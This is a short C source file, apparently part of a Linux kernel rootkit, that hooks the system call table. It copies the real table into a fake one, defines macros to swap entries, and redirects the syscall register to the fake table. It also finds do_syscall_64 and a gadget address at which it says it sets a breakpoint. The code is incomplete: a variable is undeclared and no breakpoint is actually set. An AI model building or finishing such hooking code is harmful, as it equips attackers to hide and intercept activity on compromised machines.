#include "syscall_table.h"
#include "hook.h"

#define SYSCALL(sys, args...) ((long(*)())sct[__NR_##sys])(args)
#define HOOK(sys, func) fake_sct[__NR_##sys] = (unsigned long)func

static unsigned long fake_sct[320];
static unsigned long *sct;

/*
 * rax -> fake_sct index
 */
void patch_rax_reg(struct pt_regs *regs)
{
  unsigned long off = ((unsigned long)fake_sct - (unsigned long)sct);
  regs->ax += off / sizeof(unsigned long);
}



int hook_syscall_table(void)
{
  int ret;
  unsigned long gd_addr;

  table_ptr = sys_call_table_retrieve();
  sct = (unsigned long *)table_ptr;
  if (!sct)
	return -1;

  memcpy(fake_sct, sct, sizeof(fake_sct));
  
  unsigned long call_sys_addr = get_syscall_64_addr();

  if (!call_sys_addr)
	return -ENXIO; // set errno to "no such device or address"

  debug_print("do_syscall_64 is at address %p", (void *)call_sys_addr);

  gd_addr = get_gadget_addr((void *)call_sys_addr);

  if (!gd_addr)
	return -ENXIO; // set errno to "no such device or address"

  debug_print("Setting breakpoint at address %p", (void *)gd_addr);

  return 0;
}
